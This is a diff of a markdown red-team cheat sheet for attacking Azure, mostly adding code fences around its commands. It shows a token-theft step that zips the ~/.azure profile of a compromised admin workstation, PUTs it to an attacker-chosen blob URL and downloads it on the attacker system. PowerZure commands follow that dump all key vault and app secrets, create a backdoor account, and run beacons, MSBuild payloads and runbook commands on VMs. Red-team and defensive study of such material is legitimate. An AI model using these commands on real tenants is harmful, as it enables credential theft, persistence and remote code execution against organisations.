@@ -90,63 +90,92 @@ git clone https://github.com/nccgroup/ScoutSuite.git
 
 ### Admin workstation steal access token
 ### land a admin account on a workstation, grab the access tokens for  later
-$url=BLOB STORAGE YOU WANT TO SEND TO
+```bash
+url=BLOB STORAGE YOU WANT TO SEND TO
  ls ~/.azure
  zip -r azureprofile.zip ~/.azure
 
  ### PUT to Blob
  http PUT $url @azureprofile.zip 'x-ms-blob type: BlockBlob'
-
+```
+```bash
 ### download on attacker system
 wget $url/azureprofile.zip
 unzip azureprofile.zip -d azure
+```
+
 
 ### Check who we are with Admin access
+```bash
 az account list 
 az account tenant list ### Current tenant info
 az account subscription list ### Current subscription info
 az ad signed-in-user show ### Current signed-in user
 az ad signed-in-user list-owned-objects ### Get owned objects by current user
 az account management-group list #Not allowed by default
+```
+
 
 ### azuread
-#Get the current session state
+```powershell
+# Get the current session state
 Get-AzureADCurrentSessionInfo
-#Get details of the current tenant
+# Get details of the current tenant
 Get-AzureADTenantDetail
+```
 
 ### Az Pwsh
 ### Get the information about the current context (Account, Tenant, Subscription etc.)
+```powershell
 Get-AzContext
+```
+
 ### List all available contexts
+```powershell
 Get-AzContext -ListAvailable
+```
+
 ### Enumerate subscriptions accessible by the current user
+```powershell
 Get-AzSubscription
+```
+
+### Get User Acces
+```powershell
 #Get Resource group
 Get-AzResourceGroup
+
 ### Enumerate all resources visible to the current user
 Get-AzResource
+
 ### Enumerate all Azure RBAC role assignments
 Get-AzRoleAssignment ### For all users
 Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com ### For current user
-
+```
 
 
 ### PowerZure Connect / With Token
+```powershell
 Connect-AzAccount
 $token = 'eyJ0eXAiOiJKV1QiLC....(snip)'
 Connect-AzureJWT -Token $token -AccountId 93f7295a-1243-1234-1234-1a1fa41560e8
+```
 
 ### Import
+```powershell
 ipmo C:\Path\To\Powerzure.psd1
+```
 
 ### Current User
+```powershell
 Get-AzureCurrentUser
 Get-AzureTarget
+```
 
 ### Reader Commands
 ### Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails
 ### Contributor Abilities
+```powershell
 Execute-Command 
 Execute-MSBuild 
 Get-AllSecrets ### AllAppSecrets, AllKeyVaultContents
@@ -159,42 +188,54 @@ New-AzureBackdoor -Username 'PrintService' -Password 'Print-or-Die2023!'
 New-AzureIntuneScript -Script 'C:\temp\test.ps1'
 Invoke-AzureCustomScriptExtension -VMName AzureWin10 -Command whoami
 Invoke-AzureCustomScriptExtension -VM 'Windows10' -ResourceGroup 'Defaultresourcegroup-cus' -Command 'powershell.exe -c mkdir C:\test'
+```
 
 ### Agent and Execute using userData channel
+```powershell
 Invoke-AzureVMUserDataAgent -VM AzureWin10
 Invoke-AzureVMUserDataCommand -VM AzureWin10 -Command ls
+```
+
+```powershell
 ### Execute commands and msbuild payloads
 Invoke-AzureRunProgram -VMName AzureWin10 -File C:\tempbeacon.exe
-
 Invoke-AzureRunCommand -VMName AzureWin10 -Script 'C:\temp\test.ps1'
 Invoke-AzureRunMSBuildd -VMName AzureWin10 -File 'C:\temp\build.xml'
+```
 
 ### Execute runbooks
+```powershell
 Get-AzureRunAsAccount
 Get-AzureRunAsCertificate -AutomationAccount TestAccount
 Get-AzureRunbookContent -All -OutFilePath 'C:\temp
 
 Invoke-AzureCommandRunbook -AutomationAccount TestAccount -VMName Win10Test -Command whoami
 Invoke-AzureCommandRunbook -AutomationAccount TestAccount -VMName Win10Test -Script "C:temptest.ps1"
+```
 
 ### Secrets
+```powershell
 Show-AzureKeyVaultContent -All
 Show-AzureStorageContent -All
 
 Get-AzureKeyVaultContent
 Get-AzureRunAsCertificate
+``` 
 
 ### CloudSploit to look for Vulns
-
+```bash
 git clone git@github.com:cloudsploit/scans.git
 cd cloudsploit
 npm install
+```
 
 ### Config
-$ cp config_example.js config.js
+```bash
+cp config_example.js config.js
+```
 
 ### Create azurecreds.json
-
+```powershell
 {
   "ApplicationID": "YOURAZUREAPPLICATIONID",
   "KeyValue": "YOURAZUREKEYVALUE",
@@ -217,7 +258,7 @@ $ ./index.js --csv=file.csv --console=table
 
 ### Print text to the console and save a JSON and JUnit file while ignoring passing results
 $ ./index.js --json=file.json --junit=file.xml --console=text --ignore-ok
-
+```
 
 
 
